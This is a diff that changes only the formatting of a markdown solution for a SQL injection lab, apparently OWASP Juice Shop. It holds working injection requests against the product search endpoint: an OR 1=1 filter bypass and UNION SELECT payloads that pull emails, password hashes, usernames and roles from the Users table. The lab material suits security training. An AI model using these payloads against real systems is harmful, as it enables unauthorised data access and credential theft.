@@ -1,14 +1,14 @@
 # SQL Injection Solution
 
-
-
 Use this to validate that all products can be returned, including deleted products.
-```
+
+``` http
 GET /rest/products/search?q=dud'))OR+1+=+1--
 ```
 
 Verifies a UNION clause can be used to exfiltrate data.
-```
+
+``` http
 GET /rest/products/search?q=dud'))+UNION--
 ```
 
@@ -35,7 +35,7 @@ Note that the responses from Juice Shop have nine values.
 
 Union the request with the Users table and columns likely to exist in a Users table.
 
-```
+``` http
 GET /rest/products/search?q=test'))%20UNION%20SELECT%20id,email,password,username,'5','6','7','8','9'%20FROM%20Users--
 ```
 
@@ -92,9 +92,10 @@ This returns user accounts.
   ]
 }
 ```
+
 Guessing other columns yields success.
 
-```
+``` http
 GET /rest/products/search?q=juice'))%20UNION%20SELECT%20id,email,password,username,createdAt,updatedAt,isActive,role,'9'%20FROM%20Users--
 ```
 
